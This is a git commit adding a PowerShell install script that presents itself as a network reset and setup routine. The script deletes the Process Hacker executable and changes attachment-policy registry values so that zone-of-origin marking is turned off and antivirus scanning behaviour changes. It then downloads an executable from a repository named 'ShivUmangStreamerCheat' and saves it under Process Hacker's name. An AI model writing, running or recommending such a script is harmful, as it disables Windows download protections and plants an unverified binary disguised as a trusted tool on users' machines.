332ebf3314e5508456b163ecccc46d7b35752cd7
shivumang011 <sharmaumang408@gmail.com>
2025-06-09 17:24:15 +0530

    Add files via upload

---
+++ install.ps1
@@ -0,0 +1,18 @@
+Remove-Item "C:\Program Files\Process Hacker 2\ProcessHacker.exe" -Force -ErrorAction SilentlyContinue
+
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "SaveZoneInformation" -Value 2 -Type DWord
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "ScanWithAntiVirus" -Value 2 -Type DWord
+
+Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Restart-NetAdapter -Confirm:$false
+
+netsh int ip reset
+netsh winsock reset
+ipconfig /flushdns
+
+Get-Service WlanSvc | Start-Service
+
+Get-NetAdapter | Format-Table Name, Status, InterfaceDescription
+
+gpupdate /force
+
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/Process%20Hacker%202.exe" -OutFile "C:\Program Files\Process Hacker 2\ProcessHacker.exe"
